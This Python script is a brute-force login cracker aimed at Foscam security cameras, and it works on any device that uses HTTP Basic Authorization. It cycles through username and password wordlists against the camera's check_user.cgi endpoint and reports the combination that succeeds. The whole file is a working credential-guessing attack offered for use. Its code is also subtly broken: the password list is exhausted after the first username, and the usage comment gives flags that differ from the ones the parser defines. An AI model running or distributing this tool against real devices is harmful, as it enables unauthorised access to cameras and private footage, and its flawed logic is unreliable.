import requests, base64, argparse
from termcolor import colored
from art import *


# For security camera hack (old cam)
# Example usage: python3 brute-force.py --target 192.168.0.152 --username userlist.txt --password passlist.txt 
# Tested on Foscam security camera 

# Print banner
def printBanner():
    print(colored(text2art("CISO Security Camera Hacking"), 'blue'))

# Read the files
def readWordlists(targetIP, userFile, passwordFile):
    with open(userFile, 'r') as userHandle, \
            open(passwordFile, 'r') as passHandle:
                for user in userHandle:
                    for password in passHandle:
                        combo = "{0}:{1}".format(user.strip(), password.strip())
                        loginCrack(targetIP, str(user.strip()), str(password.strip()))


# Send the request
def loginCrack(targetIP, username, password):
    combo = username + ":" + password
    comboBytes = combo.encode("ascii")
    comboB64Bytes = base64.b64encode(comboBytes)
    comboB64Str = comboB64Bytes.decode('utf-8')
    headers = {'Authorization': f'Basic {comboB64Str}'}
    r = requests.get("http://{0}/check_user.cgi".format(targetIP), headers=headers)
    if r.status_code != 200:
        print(colored('[!] The {0} combo failed!'.format(combo), 'red'))
    else:
        print(colored('[+] The {0} combo succeeded!'.format(combo), 'green'))
        exit()

def main():
    printBanner()
    parser = argparse.ArgumentParser(description="Foscam brute forcer (and whatever else uses HTTP Basic Authorization)")
    parser.add_argument("--usernames", help="Full path to the username list", required=True)
    parser.add_argument("--passwords", help="Full path to the password list", required=True)
    parser.add_argument("--target", help="The target IP address, just the IP address (EX: 192.168.1.155)", required=True)
    args = parser.parse_args()
    readWordlists(args.target, args.usernames, args.passwords)


main()
